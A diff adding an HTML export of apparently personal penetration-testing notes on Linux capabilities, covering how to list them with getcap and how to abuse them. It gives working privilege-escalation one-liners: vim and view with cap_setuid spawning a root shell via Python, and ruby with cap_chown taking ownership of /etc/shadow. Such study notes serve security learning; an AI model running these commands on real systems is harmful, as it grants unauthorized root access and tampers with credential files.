@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Capablities</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Capablities</h1><br/><p><strong><h1>Capabilities</h1></strong><h1> </h1></p><p></p><p>Capabilities are used to give granular preveleges to binary and processes.</p><p>man capabilites   -→ More Info</p><p></p><p>getcap -r / 		:		Tool to list enabled capabilites. </p><p></p><p>getcap -r / 2&gt;/dev/null		:  	As a non preveleged user it gives a lot of error. Thus we add 2&gt;/dev/null to see only the output</p><p></p><p>eg. <strong>cap_setuid+ep</strong></p><p></p><p><img src="images/416-1.png" alt="images/416-1.png" /></p><p></p><p>For example: vim has capabilities of setuid.</p><p>Note: If we list vim binary, we can&#39;t see any differnece.</p><p></p><p><img src="images/416-2.png" alt="images/416-2.png" /></p><p></p><p>Now, we can use vim from GTFOBin capabilities section</p><p>./vim -c &#39;:py3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</p><p></p><p>Note: py3 → python3 or py → python or py2 → python2</p><p>Note: view can be used using the same way as it is also having setuid capability</p><p></p><p>./view -c &#39;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</p><p></p><p></p><p><strong>eg. cap_chown+ep</strong></p><p><img src="images/416-3.png" alt="images/416-3.png" /></p><p></p><p><strong>/usr/local/bin/ruby -e &quot;File.chown(1002, 1002, &#39;/etc/shadow&#39;)&quot;</strong></p><p></p><p>This is change the ownership of the /etc/shadow file to our controlled user. Next, we can add a root password &amp; switch to root.</p><p></p></div>
+</body>
+</html>
